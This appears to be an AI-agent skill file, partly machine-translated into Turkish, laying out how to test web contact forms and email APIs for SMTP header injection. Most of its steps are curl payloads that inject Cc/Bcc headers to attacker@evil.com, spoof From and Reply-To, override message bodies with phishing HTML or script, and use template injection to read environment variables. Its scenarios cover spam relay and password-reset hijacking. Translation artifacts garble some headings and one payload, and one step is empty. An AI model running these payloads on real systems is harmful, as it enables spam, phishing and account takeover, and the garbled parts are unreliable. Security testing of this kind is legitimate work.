---
name: testing-for-email-header-injection
description: Test web application email functionality for SMTP header injection vulnerabilities that allow attackers to inject additional email headers, modify recipients, and abuse contact forms for spam
  relay.
tags:
- contact-form
- spam-relay
- header-injection
- crlf-injection
- smtp-injection
- email-injection
- fetih
- web-application-security
- cybersecurity
- email-security
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- alert
- api
- email
- endpoint
- header
- http
- injection
- log
- password
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Testing for Email Header Injection


## Ne Zaman Kullanılır
- testing yaparken contact forms, feedback forms, or "email a friend" functionality
- During assessment of password reset email functionality
- testing yaparken newsletter subscription or notification email systems
- During penetration testing of applications that send emails based on user input
- auditing yaparken email-related API endpoints for header injection

## Ön Gereksinimler
- Burp Suite for intercepting and modifying HTTP requests
- Understanding of SMTP protocol and email header structure
- Bilgi: CRLF injection techniques (\r\n sequences)
- Test email accounts for receiving injected emails
- Erişim: application features that trigger email sending
- SMTP server logs access for monitoring injection attempts

## İş Akışı

### Adım 1 — Identify Email Injection Points
```bash


curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com&subject=Hello&message=Test message"
```

### Adım 2 — Test for CRLF Header Injection
```bash
curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com%0ACc:attacker@evil.com&message=Test"

curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com%0ABcc:attacker@evil.com&message=Test"

curl -X POST http://target.com/contact \
  -d "name=Test%0ACc:attacker@evil.com&email=test@test.com&message=Test"

curl -X POST http://target.com/contact \
  -d "name=Test&email=test@test.com&subject=Hello%0ABcc:attacker@evil.com&message=Test"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0D%0ACc:attacker@evil.com"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0ACc:attacker@evil.com"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0DCc:attacker@evil.com"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%250ACc:attacker@evil.com"
```

### Adım 3 — Inject Custom Email Content
```bash
curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AContent-Type:multipart/mixed;boundary=boundary123%0A--boundary123%0AContent-Type:text/html%0A%0A<script>alert(1)</script>"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AFrom:ceo@target.com"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0AReply-To:attacker@evil.com"
```

### Adım 4 — Test IMAP/SMTP Injection
```bash
curl -X POST http://target.com/webmail/search \
  -d "query=test%0Aİncele: INBOX"

curl -X POST http://target.com/api/send \
  -d "to=test@test.com%0ARCPT TO:attacker@evil.com"

curl -X POST http://target.com/api/verify \
  -d "email=test@test.com%0AVRFY admin"

curl -X POST http://target.com/contact \
  -d "email=test@test.com%0ATo:victim1@target.com%0ATo:victim2@target.com%0ATo:victim3@target.com"
```

### Adım 5 — Test JSON-Based Email APIs
```bash
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com\nCc:attacker@evil.com","subject":"Test","body":"Test"}'

curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":["test@test.com","attacker@evil.com"],"subject":"Test","body":"Test"}'

curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com","subject":"Test","body":"{{constructor.constructor(\"return process.env\")()}}"}'
```

### Adım 6 — Validate Bul:ings
```bash


```

## Key Concepts

| Concept | Description |
|---------|-------------|
| CRLF Injection | Injecting carriage return and line feed characters to create new email headers |
| Header Injection | Adding unauthorized headers (Cc, Bcc, From) to outgoing emails |
| Spam Relay | Abusing email functionality to send spam to arbitrary recipients |
| Email Spoofing | Modifying From or Reply-To headers to impersonate trusted senders |
| MIME Manipulation | Injecting MIME boundaries to override email body content |
| SMTP Command Injection | Injecting raw SMTP commands through unsanitized email parameters |
| Newline Characters | \r\n (CRLF), \n (LF), \r (CR) used to separate email headers |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for modifying email-related form submissions |
| swaks | Swiss Army Knife for SMTP testing and header injection validation |
| OWASP ZAP | Automated scanner with email injection Tespit |
| mailhog | Local SMTP testing server for capturing injected emails |
| smtp4dev | Development SMTP server for monitoring email injection results |
| Nuclei | Template scanner with email header injection Tespit templates |

## Common Scenarios

1. **Spam Relay** — Inject BCC headers to relay mass emails through the target's SMTP server, bypassing spam filters that trust the sender domain
2. **Phishing via Contact Form** — Modify From and Reply-To headers to send phishing emails appearing to originate from the target organization
3. **Password Reset Hijack** — Inject CC header in password reset flow to receive a copy of reset tokens sent to the victim
4. **Email Content Override** — Inject MIME Content-Type headers to replace legitimate email body with malicious phishing content
5. **Internal Email Abuse** — Use header injection to send emails to internal addresses not normally accessible through the application

## Output Format

```
## Email Header Injection Report
- **Target**: http://target.com/contact
- **Injection Point**: email field in contact form
- **Encoding Required**: URL-encoded LF (%0A)

### Bul:ings
| # | Field | Payload | Result | Severity |
|---|-------|---------|--------|----------|
| 1 | email | test@test.com%0ACc:evil@evil.com | CC header injected | High |
| 2 | email | test@test.com%0ABcc:evil@evil.com | BCC header injected | High |
| 3 | name | Test%0AFrom:ceo@target.com | From spoofing | Medium |

### İyileştirme
- Validate email addresses with strict regex rejecting newline characters
- Strip \r, \n, and encoded variants from all email-related input
- Use parameterized email APIs that separate headers from data
- Implement rate limiting on email-sending functionality
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 7002fe9b3ef557d0
-->

